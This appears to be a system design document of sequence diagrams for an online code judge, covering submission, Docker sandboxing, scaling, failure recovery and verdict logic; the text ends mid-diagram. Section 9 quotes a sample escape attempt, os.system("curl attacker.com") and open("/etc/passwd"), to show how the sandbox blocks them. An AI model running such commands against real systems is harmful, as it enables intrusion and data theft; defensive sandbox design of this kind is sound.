# Online Code Judge - Sequence Diagrams

This document contains detailed sequence diagrams showing interaction flows for the Online Code Judge system, including
code submission, execution, real-time status updates, and failure scenarios.

---

## Table of Contents

1. [Code Submission Flow (Happy Path)](#1-code-submission-flow-happy-path)
2. [Docker Container Execution](#2-docker-container-execution)
3. [Compilation and Test Case Execution](#3-compilation-and-test-case-execution)
4. [Real-Time Status Updates via WebSocket](#4-real-time-status-updates-via-websocket)
5. [Contest Submission with High Priority](#5-contest-submission-with-high-priority)
6. [Worker Auto-Scaling](#6-worker-auto-scaling)
7. [Worker Failure and Recovery](#7-worker-failure-and-recovery)
8. [Test Case Cache Hit/Miss](#8-test-case-cache-hitmiss)
9. [Security Violation Detection](#9-security-violation-detection)
10. [Verdict Determination Flow](#10-verdict-determination-flow)

---

## 1. Code Submission Flow (Happy Path)

**Flow:**

Shows the complete flow when a user submits code and receives an Accepted verdict.

**Steps:**

1. **User Submits** (0ms): User clicks "Submit" button with Python code
2. **API Gateway** (50ms): JWT validation, rate limit check (100 submissions/hour)
3. **Submission Service** (50ms): Validate code size (< 64 KB), language supported
4. **Create Record** (20ms): INSERT into PostgreSQL submissions table (status: Queued)
5. **Publish to Kafka** (30ms): Publish message to topic submissions.normal
6. **Return to Client** (50ms): Return submission_id, status: Queued
7. **Queue Wait** (2000ms): Message waits in Kafka queue (avg 2 seconds)
8. **Worker Consumes** (100ms): Judge Manager assigns to available worker
9. **Create Container** (800ms): Docker run with security policies
10. **Execute Tests** (3000ms): Run code against 10 test cases
11. **All Pass** (50ms): All outputs match expected
12. **Update Database** (30ms): UPDATE verdict = 'Accepted', runtime, memory
13. **Update Cache** (20ms): SET Redis submission:id with result
14. **Notify Client** (200ms): WebSocket push or polling returns Accepted

**Total Time:** ~6.2 seconds (user sees result in 6 seconds)

**Performance:**

- Submission acceptance: < 200ms (fast feedback that code received)
- Execution: ~6 seconds (typical for Python)
- Client experience: Good (< 10 seconds for simple code)

```mermaid
sequenceDiagram
    participant User
    participant WebUI as Web UI
    participant API as API Gateway
    participant SubmitSvc as Submission Service
    participant DB as PostgreSQL
    participant Kafka
    participant Manager as Judge Manager
    participant Worker as Judge Worker
    participant Docker
    participant Redis
    participant WebSocket
    User ->> WebUI: 1. Click Submit<br/>Code: def solution(x): return x+1
    WebUI ->> API: 2. POST /api/submit<br/>Headers: Authorization Bearer JWT
    API ->> API: 3. Validate JWT<br/>Check rate limit (100/hour)
    API ->> SubmitSvc: 4. Forward request
    SubmitSvc ->> SubmitSvc: 5. Validate code<br/>Size: 512 bytes ✓<br/>Language: python3 ✓
    SubmitSvc ->> DB: 6. INSERT submission<br/>status: Queued
    DB -->> SubmitSvc: submission_id: sub_123
    SubmitSvc ->> Kafka: 7. Publish message<br/>topic: submissions.normal<br/>partition: hash(problem_id)
    Kafka -->> SubmitSvc: ✓ Acknowledged
    SubmitSvc -->> WebUI: 8. Return response<br/>{id: sub_123, status: Queued}
    WebUI -->> User: Submission accepted! (~200ms)
    Note over Kafka: Queue wait: ~2 seconds
    Manager ->> Kafka: 9. Poll for messages
    Kafka -->> Manager: Message: sub_123
    Manager ->> Worker: 10. Assign to Worker 5
    Worker ->> Docker: 11. Create container<br/>Security: seccomp, AppArmor, cgroups<br/>(800ms)
    Docker -->> Worker: Container ready
    Worker ->> Docker: 12. Execute tests<br/>10 test cases<br/>(3 seconds)
    Docker -->> Worker: All outputs correct
    Worker ->> Worker: 13. Determine verdict<br/>All passed → Accepted
    Worker ->> DB: 14. UPDATE submission<br/>verdict: Accepted<br/>runtime: 234ms<br/>memory: 15MB
    Worker ->> Redis: 15. SET submission:sub_123<br/>TTL: 1 hour
    Worker ->> WebSocket: 16. Notify client<br/>Push update via WebSocket
    WebSocket -->> WebUI: Verdict: Accepted
    WebUI -->> User: ✅ Accepted! (Total: ~6.2s)
```

---

## 2. Docker Container Execution

**Flow:**

Shows the detailed Docker container creation and execution process with security layers.

**Steps:**

1. **Worker Receives Job** (0ms): Worker consumes message from Kafka
2. **Prepare Code** (10ms): Base64 decode code, write to /tmp/solution.py
3. **Create Container** (800ms):
    - Docker run with security options
    - Seccomp profile loaded
    - AppArmor policy applied
    - Cgroups limits set (1 CPU, 512 MB RAM)
    - Network isolation (--network none)
    - Read-only filesystem (--read-only)
    - Writable /tmp (--tmpfs /tmp)
4. **Copy Code to Container** (50ms): docker cp solution.py container:/tmp/
5. **Execute** (3000ms): timeout 5s python3 /tmp/solution.py < input.txt
6. **Capture Output** (10ms): docker logs container > output.txt
7. **Compare** (20ms): diff output.txt expected.txt
8. **Cleanup** (100ms): docker rm -f container

**Security Layers Applied:**

- Namespace isolation (PID, network, mount)
- Seccomp (block fork, execve, socket syscalls)
- AppArmor (deny /etc, /proc, /sys access)
- Cgroups (CPU: 1 core, Memory: 512 MB, PIDs: 100)
- Network none (no internet)
- Read-only root (only /tmp writable)

**Total Overhead:** 1 second (container creation + cleanup)

```mermaid
sequenceDiagram
    participant Worker as Judge Worker
    participant Docker as Docker Engine
    participant Kernel as Linux Kernel
    participant Container as Docker Container
    participant Code as User Code
    Worker ->> Worker: 1. Receive job from Kafka<br/>submission_id: sub_123<br/>code: base64_encoded
    Worker ->> Worker: 2. Decode code<br/>base64_decode → solution.py
    Worker ->> Docker: 3. Create container (800ms)<br/>docker run --rm --network none<br/>--memory 512m --cpus 1.0<br/>--pids-limit 100 --read-only<br/>--tmpfs /tmp:size=100m<br/>--security-opt seccomp=strict.json<br/>--security-opt apparmor=judge<br/>judge-runtime:python3.9
    Docker ->> Kernel: 4. Apply security layers
    Kernel ->> Kernel: Create namespaces (PID, net, mount)
    Kernel ->> Kernel: Load seccomp profile
    Kernel ->> Kernel: Apply AppArmor policy
    Kernel ->> Kernel: Set cgroups limits
    Kernel -->> Docker: Container ready
    Docker -->> Worker: Container ID: abc123
    Worker ->> Container: 5. Copy code (50ms)<br/>echo solution.py > /tmp/solution.py
    Container -->> Worker: ✓ Code copied
    Worker ->> Container: 6. Execute (3s)<br/>timeout 5s python3 /tmp/solution.py<br/>stdin: test_input.txt
    Container ->> Code: Run user code
    Code ->> Code: Execute logic<br/>Process input<br/>Generate output
    Code -->> Container: stdout: result
    Container -->> Worker: Exit code: 0<br/>stdout: captured
    Worker ->> Worker: 7. Capture output (10ms)<br/>Read stdout from container
    Worker ->> Worker: 8. Compare (20ms)<br/>diff output.txt expected.txt<br/>Result: Match ✓
    Worker ->> Docker: 9. Cleanup (100ms)<br/>docker rm -f abc123
    Docker ->> Kernel: Destroy container<br/>Release resources
    Docker -->> Worker: ✓ Removed
    Note over Worker, Code: Total: ~4 seconds (1s overhead + 3s execution)
```

---

## 3. Compilation and Test Case Execution

**Flow:**

Shows compilation (for Java/C++) and execution against multiple test cases.

**Steps:**

1. **Check Language** (1ms): language = java
2. **Compile** (500ms): javac Solution.java inside container
3. **Compilation Success** (10ms): Solution.class created
4. **For Each Test Case** (loop 10 times):
    - Read input (5ms): cat test_case_1.in
    - Execute (300ms): timeout 1s java Solution < input
    - Capture output (5ms): stdout > output.txt
    - Compare (5ms): diff output.txt expected_1.out
    - Check time (1ms): execution_time = 234ms < 1000ms ✓
    - Check memory (1ms): memory_used = 45MB < 512MB ✓
5. **All Tests Pass** (1ms): 10/10 passed
6. **Verdict** (1ms): Accepted

**Test Case Execution Time:**

- Per test case: 316ms (300ms execution + 16ms overhead)
- 10 test cases: 3.16 seconds total
- Compilation: 500ms
- **Total: 3.66 seconds**

**Optimizations:**

- Test cases run sequentially (not parallel, fair timing)
- Timeout enforced per test (prevents infinite loops)
- Memory monitored continuously (kill if exceeds limit)

```mermaid
sequenceDiagram
    participant Worker as Judge Worker
    participant Container as Docker Container
    participant Compiler
    participant Runtime
    participant TestCases as Test Cases
    Worker ->> Worker: 1. Check language<br/>language: java<br/>Needs compilation: Yes
    Worker ->> Container: 2. Start container<br/>With Java 11 JDK
    Container -->> Worker: Ready
    Worker ->> Container: 3. Copy code<br/>Solution.java
    Container -->> Worker: ✓ Copied
    Worker ->> Container: 4. Compile (500ms)<br/>javac Solution.java
    Container ->> Compiler: Invoke Java compiler
    Compiler ->> Compiler: Parse, compile, generate bytecode
    Compiler -->> Container: Solution.class created
    Container -->> Worker: ✓ Compilation successful
    Note over Worker, TestCases: Execute 10 test cases sequentially

    loop Test Cases 1-10
        Worker ->> TestCases: 5. Read test case N<br/>test_case_N.in
        TestCases -->> Worker: Input data
        Worker ->> Container: 6. Execute (300ms)<br/>timeout 1s java Solution<br/>stdin: test_input
        Container ->> Runtime: Run Java bytecode
        Runtime ->> Runtime: Process input<br/>Generate output
        Runtime -->> Container: stdout: result
        Container -->> Worker: output, exit_code: 0
        Worker ->> Worker: 7. Capture output<br/>Save to output_N.txt
        Worker ->> TestCases: 8. Read expected<br/>expected_N.out
        TestCases -->> Worker: Expected output
        Worker ->> Worker: 9. Compare<br/>diff output_N.txt expected_N.out

        alt Output matches
            Worker ->> Worker: ✓ Test N passed
        else Output differs
            Worker ->> Worker: ✗ Wrong Answer<br/>Stop execution
        end

        Worker ->> Worker: 10. Check time<br/>execution_time: 234ms<br/>limit: 1000ms<br/>✓ Within limit
        Worker ->> Worker: 11. Check memory<br/>memory_used: 45MB<br/>limit: 512MB<br/>✓ Within limit
    end

    Worker ->> Worker: 12. All tests passed<br/>10/10 ✓
    Worker ->> Worker: 13. Determine verdict<br/>Verdict: Accepted<br/>Runtime: 234ms avg<br/>Memory: 45MB max
    Note over Worker: Total: 3.66s (500ms compile + 3.16s tests)
```

---

## 4. Real-Time Status Updates via WebSocket

**Flow:**

Shows how clients receive real-time status updates using WebSocket and Redis Pub/Sub.

**Steps:**

1. **User Submits** (0ms): Code submitted, submission_id returned
2. **Client Connects** (100ms): WebSocket connection to ws://server/submissions/sub_123
3. **WebSocket Server Subscribes** (20ms): Subscribe to Redis channel submission:sub_123
4. **Worker Starts** (2000ms): Worker picks up job, publishes status: Running
5. **Status Update 1** (50ms): WebSocket server receives from Redis, pushes to client
6. **Test Progress** (3000ms): Worker publishes progress after each test (Test 5/10)
7. **Status Update 2** (50ms): Client receives progress update
8. **Execution Complete** (100ms): Worker publishes final verdict: Accepted
9. **Status Update 3** (50ms): Client receives final verdict
10. **Display Result** (100ms): UI shows Accepted with runtime/memory

**Latency:**

- Worker publishes → Redis → WebSocket → Client: < 100ms
- Total real-time feedback delay: < 100ms (excellent)

**Fallback (Polling):**

- If WebSocket fails, client polls GET /api/submissions/sub_123 every 1 second
- Redis cache serves status (< 10ms response)

```mermaid
sequenceDiagram
    participant User
    participant WebUI as Web UI
    participant WS as WebSocket Server
    participant Redis as Redis Pub/Sub
    participant Worker as Judge Worker
    participant DB as PostgreSQL
    User ->> WebUI: 1. Submit code
    WebUI ->> WebUI: 2. POST /api/submit<br/>Response: {id: sub_123}
    WebUI ->> WS: 3. WebSocket connect (100ms)<br/>ws://server/submissions/sub_123
    WS ->> Redis: 4. Subscribe (20ms)<br/>SUBSCRIBE submission:sub_123
    Redis -->> WS: ✓ Subscribed
    WS -->> WebUI: ✓ Connected
    Note over Worker: Queue wait: ~2 seconds
    Worker ->> Worker: 5. Pick up job<br/>Start execution
    Worker ->> Redis: 6. Publish status (10ms)<br/>PUBLISH submission:sub_123<br/>{status: Running, test: 0/10}
    Redis ->> WS: 7. Message received<br/>{status: Running}
    WS ->> WebUI: 8. Push update (50ms)<br/>WebSocket send
    WebUI ->> User: Display: Running...
    Note over Worker: Executing tests...
    Worker ->> Worker: Test case 5 complete
    Worker ->> Redis: 9. Publish progress (10ms)<br/>PUBLISH submission:sub_123<br/>{status: Running, test: 5/10}
    Redis ->> WS: 10. Message received
    WS ->> WebUI: 11. Push update (50ms)
    WebUI ->> User: Display: Running test 5/10...
    Note over Worker: All tests complete
    Worker ->> DB: 12. Update verdict<br/>verdict: Accepted, runtime: 234ms
    Worker ->> Redis: 13. Publish final (10ms)<br/>PUBLISH submission:sub_123<br/>{status: Completed, verdict: Accepted}
    Redis ->> WS: 14. Message received
    WS ->> WebUI: 15. Push final (50ms)
    WebUI ->> User: ✅ Accepted! Runtime: 234ms
    Note over User, Worker: Total feedback delay: < 100ms per update

    alt Fallback: Polling
        WebUI ->> DB: GET /api/submissions/sub_123<br/>Every 1 second
        DB -->> WebUI: {status: Running, test: 5/10}
        WebUI ->> User: Display status
    end
```

---

## 5. Contest Submission with High Priority

**Flow:**

Shows how contest submissions get priority processing to ensure fair timing.

**Steps:**

1. **Contest Active** (0ms): Contest "Weekly Contest 123" is live
2. **User Submits** (0ms): Submits code during contest
3. **Priority Flag** (10ms): Submission Service detects active contest, sets priority: high
4. **Publish to High Priority Queue** (30ms): Kafka topic submissions.high_priority
5. **Separate Consumer** (0ms): Dedicated workers consume high_priority topic first
6. **Fast Pickup** (500ms): Contest submissions picked up faster (500ms vs 2s normal queue)
7. **Execute** (3000ms): Same execution as normal
8. **Update Leaderboard** (50ms): Update contest rankings immediately
9. **Rank Calculation** (100ms): Calculate rank based on (solved_count, total_time)

**Performance:**

- Contest submission latency: 3.5 seconds (vs 6 seconds normal)
- Queue wait reduced: 500ms (vs 2s normal)
- Leaderboard update: Real-time (< 100ms)

**Fairness:**

- All contest submissions use identical execution environment
- Time measured from submission to acceptance (fair timing)
- No geographic advantage (all execute in same region)

```mermaid
sequenceDiagram
    participant User
    participant WebUI as Web UI
    participant SubmitSvc as Submission Service
    participant HighPQ as Kafka High Priority
    participant NormalQ as Kafka Normal
    participant ContestWorker as Contest Worker Pool
    participant NormalWorker as Normal Worker Pool
    participant Leaderboard
    Note over User, WebUI: Contest "Weekly 123" is LIVE
    User ->> WebUI: 1. Submit during contest<br/>Problem: Two Sum
    WebUI ->> SubmitSvc: 2. POST /api/submit<br/>Headers: contest_id: 123
    SubmitSvc ->> SubmitSvc: 3. Check contest<br/>Is contest active? YES<br/>Set priority: HIGH
    SubmitSvc ->> HighPQ: 4. Publish (30ms)<br/>topic: submissions.high_priority<br/>partition: hash(problem_id)
    HighPQ -->> SubmitSvc: ✓ Queued
    Note over NormalQ: Normal submissions<br/>go to normal queue
    SubmitSvc -->> WebUI: 5. Response<br/>{id: sub_123, priority: high}
    Note over HighPQ: Fast queue wait: ~500ms<br/>(vs 2s for normal)
    ContestWorker ->> HighPQ: 6. Poll high priority<br/>ALWAYS check high priority first
    HighPQ -->> ContestWorker: Message: sub_123
    ContestWorker ->> ContestWorker: 7. Execute (3s)<br/>Same process as normal
    ContestWorker ->> ContestWorker: 8. Verdict: Accepted<br/>Runtime: 234ms
    ContestWorker ->> Leaderboard: 9. Update rankings (50ms)<br/>contest_id: 123<br/>user_id: alice<br/>problem: two_sum<br/>time: 234ms<br/>penalty: submission_time
    Leaderboard ->> Leaderboard: 10. Recalculate rank (100ms)<br/>Sort by: (problems_solved DESC, total_time ASC)<br/>Alice rank: 15 → 12
    Leaderboard -->> WebUI: Rank update
    WebUI ->> User: ✅ Accepted!<br/>Rank:#12 (↑3)
    Note over User, Leaderboard: Total: ~3.68s<br/>(500ms queue + 3s exec + 180ms updates)

    alt Normal submission (non-contest)
        User ->> WebUI: Submit practice
        WebUI ->> SubmitSvc: POST /api/submit<br/>No contest_id
        SubmitSvc ->> NormalQ: Publish to normal
        Note over NormalQ: Wait: ~2s
        NormalWorker ->> NormalQ: Poll normal queue
        Note over User: Total: ~6s (slower, OK for practice)
    end
```

---

## 6. Worker Auto-Scaling

**Flow:**

Shows how workers auto-scale based on Kafka queue depth.

**Steps:**

1. **Normal Load** (T0): 10 workers, queue depth 8,000 messages (800/worker, healthy)
2. **Contest Starts** (T1): 10k submissions/sec spike, queue depth rises rapidly
3. **Queue Depth Spike** (T2): Queue depth 50,000 messages (5,000/worker, unhealthy)
4. **Prometheus Detects** (T3): Scrapes Kafka metrics, alert threshold exceeded
5. **Kubernetes HPA Triggers** (T4): HPA decides to scale up (30 seconds decision)
6. **Launch New Workers** (T5): Create 40 new worker pods (90 seconds EC2 launch)
7. **Pods Start** (T6): Docker pull image, start consuming (60 seconds)
8. **Kafka Rebalance** (T7): Redistribute partitions across 50 workers (30 seconds)
9. **New Equilibrium** (T8): 50 workers, queue depth 50,000 (1,000/worker, healthy)
10. **Total Scale-Up Time**: 210 seconds (3.5 minutes from spike to equilibrium)

**Metrics:**

- Before: 8,000 messages, 10 workers, 800/worker ✓
- During spike: 50,000 messages, 10 workers, 5,000/worker ✗
- After scale: 50,000 messages, 50 workers, 1,000/worker ✓

```mermaid
sequenceDiagram
    participant Contest
    participant Kafka as Kafka Queue
    participant Prometheus
    participant K8sHPA as Kubernetes HPA
    participant EC2
    participant Workers as Worker Pods
    Note over Kafka, Workers: T0: Normal load<br/>10 workers, 8k messages
    Contest ->> Kafka: T1: Contest starts!<br/>10k submissions/sec spike
    Kafka ->> Kafka: Queue depth rises<br/>8k → 50k messages in 30s
    Note over Kafka: T2: Queue depth critical<br/>50k messages / 10 workers<br/>= 5,000 per worker ✗
    Prometheus ->> Kafka: T3: Scrape metrics (every 15s)<br/>kafka_consumer_lag
    Kafka -->> Prometheus: Queue depth: 50,000<br/>Workers: 10<br/>Ratio: 5,000/worker
    Prometheus ->> Prometheus: Check threshold<br/>Target: < 1,000/worker<br/>Current: 5,000/worker<br/>Status: EXCEED
    Prometheus ->> K8sHPA: T4: Trigger alert (30s)<br/>Scale up needed
    K8sHPA ->> K8sHPA: Calculate desired replicas<br/>Target ratio: 1,000/worker<br/>50,000 / 1,000 = 50 workers<br/>Current: 10<br/>Need: +40 workers
    K8sHPA ->> EC2: T5: Launch instances (90s)<br/>Request 40 new pods<br/>Instance type: c5.9xlarge
    EC2 ->> EC2: Provision EC2 instances<br/>Attach to cluster
    EC2 -->> K8sHPA: ✓ 40 instances ready
    K8sHPA ->> Workers: T6: Start pods (60s)<br/>Pull Docker image<br/>judge-runtime:v2.3<br/>Join Kafka consumer group
    Workers ->> Workers: Image cached, start fast<br/>Register with Kafka
    Workers ->> Kafka: T7: Join consumer group (30s)<br/>40 new consumers join<br/>Total: 50 consumers
    Kafka ->> Kafka: Rebalance partitions<br/>Redistribute 10 partitions<br/>across 50 consumers
    Note over Kafka, Workers: T8: New equilibrium<br/>50k messages / 50 workers<br/>= 1,000 per worker ✓
    Kafka ->> Workers: Process at full capacity<br/>50 workers × 100 jobs/sec<br/>= 5,000 jobs/sec throughput
    Note over Contest, Workers: Total scale-up time: 210s<br/>(30s detect + 90s launch + 60s start + 30s rebalance)
    Note over Kafka: Queue drains over next 10 seconds<br/>50k → 40k → 30k → ...
```

---

## 7. Worker Failure and Recovery

**Flow:**

Shows how system handles worker crash without losing submissions.

**Steps:**

1. **Worker Processing** (T0): Worker 5 processing submission sub_123
2. **Worker Crashes** (T1): Process killed (OOM, segfault, etc.)
3. **Heartbeat Stops** (T2): No heartbeat for 30 seconds
4. **Manager Detects** (T3): Judge Manager marks Worker 5 as dead
5. **Message Unacknowledged** (T4): Kafka detects message not committed
6. **Kafka Rebalances** (T5): Redistribute Worker 5's partitions to others (30 seconds)
7. **Message Redelivered** (T6): sub_123 back in queue after 60 seconds
8. **Worker 10 Picks Up** (T7): Another worker consumes message
9. **Idempotency Check** (T8): Check if sub_123 already judged (no)
10. **Execute** (T9): Process submission normally
11. **Verdict Delivered** (T10): Client receives result

**Client Experience:**

- Submission shows "Running" during crash
- No error message (transparent retry)
- Just longer wait time (+60-90 seconds)
- Final verdict delivered successfully

**Data Loss:** ZERO (Kafka persistence guarantees at-least-once delivery)

```mermaid
sequenceDiagram
    participant Kafka
    participant Worker5 as Worker 5
    participant Manager as Judge Manager
    participant Worker10 as Worker 10
    participant DB as PostgreSQL
    participant Client
    Note over Worker5: T0: Processing sub_123<br/>Status: Running
    Worker5 ->> Kafka: Consuming message<br/>sub_123 from partition 3
    Worker5 ->> Worker5: Create container<br/>Executing tests...
    Worker5 ->> Manager: Heartbeat (every 10s)<br/>Status: Alive
    Note over Worker5: T1: Worker crashes!<br/>Process killed (OOM)
    Worker5 --x Manager: T2: Heartbeat stops<br/>No signal sent
    Manager ->> Manager: T3: Wait 30 seconds<br/>No heartbeat received<br/>Mark Worker 5 DEAD
    Manager ->> Kafka: T4: Report dead consumer<br/>consumer_id: worker-5
    Kafka ->> Kafka: T5: Detect uncommitted message<br/>sub_123 not acknowledged<br/>Message still in partition
    Kafka ->> Kafka: T6: Consumer group rebalance (30s)<br/>Redistribute partition 3<br/>from Worker 5 to others
    Note over Kafka: T7: Message redelivered<br/>after 60 seconds timeout
    Kafka ->> Worker10: T8: Deliver sub_123<br/>to Worker 10 (partition 3)
    Worker10 ->> DB: T9: Idempotency check<br/>SELECT * FROM submissions<br/>WHERE id = 'sub_123'
    DB -->> Worker10: status: Queued<br/>verdict: NULL<br/>Not judged yet ✓
    Worker10 ->> Worker10: T10: Execute normally<br/>Create container<br/>Run tests<br/>3 seconds
    Worker10 ->> Worker10: T11: Verdict: Accepted
    Worker10 ->> DB: T12: Update verdict<br/>UPDATE submissions<br/>SET verdict = 'Accepted'
    Worker10 ->> Kafka: T13: Commit offset<br/>Acknowledge message
    Worker10 ->> Client: T14: Notify<br/>WebSocket push<br/>Verdict: Accepted
    Note over Client: Total delay: +60-90s<br/>Client sees longer wait<br/>but submission NOT lost

    alt Graceful shutdown (not crash)
        Worker5 ->> Manager: Receive SIGTERM<br/>Kubernetes pod termination
        Worker5 ->> Worker5: Finish current job (30s)<br/>Complete sub_123
        Worker5 ->> Kafka: Commit offset
        Worker5 ->> Manager: Exit cleanly
        Note over Worker5: ✓ No lost submissions
    end
```

---

## 8. Test Case Cache Hit/Miss

**Flow:**

Shows test case caching strategy with three tiers (worker local, CloudFront, S3).

**Steps:**

1. **Worker Needs Test Cases** (0ms): Worker assigned problem "two_sum"
2. **Check Local Cache** (5ms): Look in /var/cache/testcases/two_sum/
3. **Cache Hit** (95%): Test cases found locally, read from SSD (10ms)
4. **Execute Tests** (3000ms): Use cached test cases
   OR
5. **Cache Miss** (5%): Test cases not in local cache
6. **Check CloudFront** (50ms): GET https://cdn.judge.com/testcases/two_sum.tar.gz
7. **CloudFront Hit** (99%): Edge location has cached file
8. **Download and Extract** (200ms): Download 1 MB, extract to local cache
9. **Cache Locally** (50ms): Save to /var/cache/testcases/two_sum/
10. **Execute Tests** (3000ms): Use downloaded test cases

**Cache Invalidation:**

- Problem updated → Redis Pub/Sub event published
- All workers receive event, delete local cache
- Next execution fetches fresh from S3

**Performance:**

- Local hit (95%): 10ms overhead
- CloudFront miss (4%): 250ms overhead
- S3 direct (1%): 500ms overhead
- **Average**: 10 * 0.95 + 250 * 0.04 + 500 * 0.01 = 24.5ms

```mermaid
sequenceDiagram
    participant Worker as Judge Worker
    participant LocalCache as Local SSD Cache
    participant CloudFront as CloudFront CDN
    participant S3
    participant RedisPubSub as Redis Pub/Sub
    Worker ->> Worker: 1. Assigned problem<br/>problem_id: two_sum
    Worker ->> LocalCache: 2. Check local cache (5ms)<br/>Path: /var/cache/testcases/two_sum/

    alt Cache Hit (95%)
        LocalCache -->> Worker: 3. ✓ Found locally<br/>10 test cases (1 MB)<br/>Access: 10ms
        Worker ->> Worker: 4. Read test cases<br/>Load into memory
        Worker ->> Worker: 5. Execute tests (3s)<br/>Use cached files
        Note over Worker: Total overhead: 10ms ✓
    else Cache Miss (5%)
        LocalCache -->> Worker: 6. ✗ Not found locally
        Worker ->> CloudFront: 7. Fetch from CDN (50ms)<br/>GET /testcases/two_sum.tar.gz

        alt CloudFront Hit (99% of misses)
            CloudFront -->> Worker: 8. ✓ Edge cache hit<br/>Download 1 MB (200ms)
        else CloudFront Miss (1% of misses)
            CloudFront ->> S3: 9. Fetch from origin<br/>GET s3://testcases/two_sum.tar.gz
            S3 -->> CloudFront: 10. Return file (300ms)
            CloudFront -->> Worker: 11. Return file (500ms total)
        end

        Worker ->> Worker: 12. Extract archive<br/>tar -xzf two_sum.tar.gz<br/>50ms
        Worker ->> LocalCache: 13. Cache locally<br/>Write to /var/cache/testcases/two_sum/<br/>Future requests will hit cache
        Worker ->> Worker: 14. Execute tests (3s)<br/>Use downloaded files
        Note over Worker: Total overhead: 250-500ms
    end

    Note over Worker, S3: Cache Invalidation Flow
    S3 ->> RedisPubSub: Problem updated<br/>PUBLISH problem:two_sum:updated
    RedisPubSub ->> Worker: Event received<br/>on subscribed channel
    Worker ->> LocalCache: Delete cached test cases<br/>rm -rf /var/cache/testcases/two_sum/
    LocalCache -->> Worker: ✓ Cache invalidated
    Note over Worker: Next execution will fetch<br/>fresh test cases from S3
```

---

## 9. Security Violation Detection

**Flow:**

Shows how system detects and handles malicious code attempting to escape container.

**Steps:**

1. **User Submits Malicious Code** (0ms): Code with os.system("curl attacker.com")
2. **Worker Executes** (0ms): Create container with strict seccomp profile
3. **Code Attempts Network** (100ms): Code tries to make network connection
4. **Seccomp Blocks** (0ms): socket() syscall blocked by seccomp whitelist
5. **Process Killed** (1ms): EPERM error, process terminates
6. **AppArmor Logs** (10ms): Security violation logged to syslog
7. **Worker Detects** (50ms): Exit code indicates security violation
8. **Update Verdict** (30ms): Verdict = "Security Violation" (special case)
9. **Ban Check** (100ms): Check if user has repeated violations
10. **Ban User** (if >3 violations): Temporarily ban user account
11. **Alert Security Team** (200ms): Send alert to security monitoring

**Blocked Syscalls:**

- socket, connect, bind, listen (network access)
- execve, fork, clone (process creation)
- mount, umount (filesystem modification)
- ptrace (debugging other processes)

**Result:**

- Malicious code cannot escape container
- System protected
- User warned or banned
- Security team notified for investigation

```mermaid
sequenceDiagram
    participant User as Malicious User
    participant Worker as Judge Worker
    participant Container as Docker Container
    participant Seccomp as Seccomp Filter
    participant AppArmor as AppArmor Policy
    participant SecurityTeam as Security Monitoring
    participant DB as PostgreSQL
    User ->> Worker: 1. Submit malicious code<br/>import os<br/>os.system("curl attacker.com")
    Worker ->> Container: 2. Create container<br/>--security-opt seccomp=strict.json<br/>--security-opt apparmor=judge
    Container -->> Worker: ✓ Container ready
    Worker ->> Container: 3. Execute code<br/>python3 solution.py
    Container ->> Container: 4. Code runs<br/>import os executed
    Container ->> Container: 5. Attempt network call<br/>os.system("curl attacker.com")
    Container ->> Seccomp: 6. syscall: socket()<br/>Attempt to create network socket
    Seccomp ->> Seccomp: 7. Check whitelist<br/>socket() NOT in whitelist<br/>Action: ERRNO
    Seccomp -->> Container: ✗ EPERM (Permission denied)
    Container ->> Container: 8. Process crashes<br/>OSError: Operation not permitted
    Container ->> AppArmor: 9. Log violation<br/>Blocked syscall: socket
    AppArmor ->> AppArmor: Write to syslog<br/>Security violation detected
    Container -->> Worker: 10. Exit code: 1<br/>stderr: OSError
    Worker ->> Worker: 11. Detect security violation<br/>Check stderr for "not permitted"<br/>Classify as security issue
    Worker ->> DB: 12. Update verdict<br/>UPDATE submissions<br/>SET verdict = 'Security Violation'<br/>SET details = 'Attempted network access'
    Worker ->> DB: 13. Check violation history<br/>SELECT COUNT(*)<br/>FROM submissions<br/>WHERE user_id = 'user_789'<br/>AND verdict = 'Security Violation'
    DB -->> Worker: Count: 4 violations
    Worker ->> DB: 14. Ban user (>3 violations)<br/>UPDATE users<br/>SET banned = true, ban_reason = 'Repeated security violations'
    Worker ->> SecurityTeam: 15. Alert security (200ms)<br/>POST /api/security/alert<br/>user_id: user_789<br/>violation: network_access<br/>code: [submitted code]
    SecurityTeam ->> SecurityTeam: 16. Review alert<br/>Investigate user behavior<br/>Determine if malicious or mistake
    Worker ->> User: 17. Notify user<br/>Verdict: Security Violation<br/>Your account has been banned<br/>Reason: Repeated attempts to bypass sandbox
    Note over User, SecurityTeam: ✅ System protected<br/>Malicious code blocked<br/>User banned<br/>Security team notified

    alt AppArmor Violation (file access)
        Container ->> AppArmor: Attempt: open("/etc/passwd")
        AppArmor ->> AppArmor: Check policy<br/>/etc/ is DENY
        AppArmor -->> Container: ✗ Permission denied
        Note over Container: Same violation handling flow
    end
```

---

## 10. Verdict Determination Flow

**Flow:**

Shows how final verdict is determined based on test case results.

**Steps:**

1. **Initialize** (0ms): verdict = null, passed = 0, failed = 0
2. **Test Case 1** (300ms): Output matches → passed++
3. **Test Case 2** (300ms): Output matches → passed++
4. **Test Case 3** (300ms): Output differs → failed++, verdict = WA, STOP
   OR
5. **Test Case 5** (timeout): Execution > 1 second → verdict = TLE, STOP
   OR
6. **Test Case 7** (segfault): Exit code 139 → verdict = RE, STOP
   OR
7. **Test Case 9** (OOM): Memory > 512 MB → verdict = MLE, STOP
   OR
8. **All 10 Pass** (3000ms): passed = 10 → verdict = AC

**Verdicts:**

- AC (Accepted): All test cases passed
- WA (Wrong Answer): Output doesn't match expected
- TLE (Time Limit Exceeded): Execution > time limit
- MLE (Memory Limit Exceeded): Memory > memory limit
- RE (Runtime Error): Segfault, exception, non-zero exit
- CE (Compilation Error): Compilation failed

**Optimization:**

- Stop on first failure (no need to run remaining tests)
- Early verdict improves latency
- Exception: AC requires all tests

```mermaid
sequenceDiagram
    participant Worker as Judge Worker
    participant TestCases
    participant Container
    participant Verdict
    Worker ->> Worker: 1. Initialize<br/>verdict = null<br/>passed = 0, failed = 0<br/>total = 10

    loop Test Cases 1-10
        Worker ->> TestCases: 2. Read test N<br/>input, expected output
        TestCases -->> Worker: Test data
        Worker ->> Container: 3. Execute<br/>timeout 1s<br/>memory limit 512MB

        alt Output Correct
            Container -->> Worker: 4a. Exit 0<br/>output matches expected<br/>time: 234ms, memory: 45MB
            Worker ->> Worker: passed++<br/>Continue to next test
        else Wrong Answer
            Container -->> Worker: 4b. Exit 0<br/>output DIFFERS from expected
            Worker ->> Verdict: 5. WA - Wrong Answer<br/>Test N failed<br/>STOP execution
            Verdict -->> Worker: Final: WA
        else Time Limit Exceeded
            Container -->> Worker: 4c. Timeout after 1s<br/>Process killed by timeout
